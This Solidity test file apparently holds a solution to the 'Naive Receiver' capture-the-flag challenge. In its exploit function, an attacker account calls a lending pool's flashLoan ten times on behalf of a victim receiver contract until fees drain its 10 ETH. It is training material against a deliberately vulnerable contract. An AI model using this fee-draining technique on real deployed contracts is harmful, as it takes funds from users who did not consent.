// SPDX-License-Identifier: UNLICENSED
// There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
// You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting
// with the lending pool and receiveing flash loans of ETH.
// Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)
pragma solidity 0.8.10;

import {BaseTest} from "../BaseTest.sol";
import "../../naive-receiver/NaiveReceiverLenderPool.sol";
import "../../naive-receiver/FlashLoanReceiver.sol";

contract NaiveReceiverTest is BaseTest {

    uint ETHER_IN_POOL = 1000 ether;
    uint ETHER_IN_RECEIVER = 10 ether;

    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    // attacker adddress
    address payable attacker;

    constructor() {
        // setup the needed user accordly
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        preSetup(1, labels);
    }

    function setUp() public override {
        super.setUp();
        attacker = users[0];
        bool sent;

        // Setup the contracts
        pool = new NaiveReceiverLenderPool();
        receiver = new FlashLoanReceiver(payable(pool));

        // Setup the tokens for the pool
        (sent, ) = address(pool).call{value: ETHER_IN_POOL}("");
        require(sent, "ETHER_IN_POOL not sent to pool");

        // Setup the Ether for the receiver
        (sent, ) = address(receiver).call{value: ETHER_IN_RECEIVER}("");
        require(sent, "ETHER_IN_RECEIVER not sent to pool");

        // Be sure the receiver has ETHER_IN_RECEIVER tokens
        assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
    }


    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */
        // call the flash loan 10 times in order to get 10 ethers as a fee and the receiver will stay with 0
        vm.startPrank(attacker);
        for (uint256 i; i < 10; i++) {
            pool.flashLoan(address(receiver), 10 ether);
        }
        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        // The receiver has now 0 in balance
        assertEq(address(receiver).balance, 0 ether);
        // The pool has now ETHER_IN_POOL + ETHER_IN_RECEIVER
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}